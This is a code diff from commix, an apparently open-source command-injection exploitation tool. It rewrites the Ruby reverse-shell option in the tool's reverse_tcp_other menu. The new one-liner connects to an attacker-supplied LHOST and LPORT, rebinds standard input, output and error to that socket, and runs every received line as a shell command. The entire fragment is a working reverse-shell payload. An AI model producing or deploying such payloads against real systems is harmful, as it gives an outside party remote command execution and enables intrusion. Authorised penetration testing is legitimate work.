@@ -226,9 +226,13 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
     # Ruby-reverse-shell
     elif other_shell == '3':
       other_shell = "ruby -rsocket -e 'exit if fork;" \
-                    "c=TCPSocket.new(\"" + settings.LHOST  + "\"," + settings.LPORT  + ");" \
-                    "while(cmd=c.gets);" \
-                    "IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+                    "c=TCPSocket.new(\"" + settings.LHOST + "\"," + settings.LPORT + ");" \
+                    "$stdin.reopen(c);" \
+                    "$stdout.reopen(c);" \
+                    "$stderr.reopen(c);" \
+                    "$stdin.each_line{|l|l=l.strip;" \
+                    "next if l.length==0;" \
+                    "(IO.popen(l,\"rb\"){|fd| fd.each_line {|o| c.puts(o.strip) }}) rescue nil }'"
       break
 
     # Python-reverse-shell 
